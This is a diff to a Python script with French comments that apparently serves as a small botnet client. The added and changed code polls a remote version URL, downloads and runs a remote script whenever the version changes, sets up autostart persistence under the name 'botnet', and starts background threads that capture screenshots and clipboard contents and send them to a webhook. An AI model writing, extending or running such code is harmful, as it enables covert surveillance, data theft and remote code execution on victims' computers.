@@ -4,6 +4,8 @@ import time
 import socket
 import hashlib
 import re
+import threading
+
 
 headers = {
     "User-Agent": "...",
@@ -53,24 +55,25 @@ def maj_version(nouvelle_version):
     except Exception as e:
         print(f"Erreur lors de la mise à jour de la version : {e}")
 
-while True:
-    try:
-        r_version = requests.get(url_version, headers=headers)
-        r_version.raise_for_status()
-        nouvelle_version = r_version.text.strip()
+def boucle():
+    while True:
+        try:
+            r_version = requests.get(url_version, headers=headers)
+            r_version.raise_for_status()
+            nouvelle_version = r_version.text.strip()
 
-        if nouvelle_version != ancienne_version:
-            print(f"Nouvelle version détectée : {nouvelle_version}")
-            ancienne_version = nouvelle_version
-            script(python_url)
-            maj_version(nouvelle_version)
-        else:
-            print("Aucune nouvelle version.")
+            if nouvelle_version != ancienne_version:
+                print(f"Nouvelle version détectée : {nouvelle_version}")
+                ancienne_version = nouvelle_version
+                script(python_url)
+                maj_version(nouvelle_version)
+            else:
+                print("Aucune nouvelle version.")
 
-    except Exception as e:
-        print(f"Erreur lors de la vérification de la version : {e}")
+        except Exception as e:
+            print(f"Erreur lors de la vérification de la version : {e}")
 
-    time.sleep(10)
+        time.sleep(10)
 
 
 url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"
@@ -375,8 +378,11 @@ def autostart_option_func(script_path=None, name="botnet"):
 
 
 
+if __name__ == "__main__":
+    # Démarrer les threads pour les options
+    threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=True).start()
+    threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=True).start()
+    threading.Thread(target=autostart_option_func, daemon=True).start()
+    threading.Thread(target=loop_check, daemon=True).start()
 
-autostart_option_func()
-clipboard_option_func(webhook)
-# Appel de la fonction
-loop_check()
+boucle()
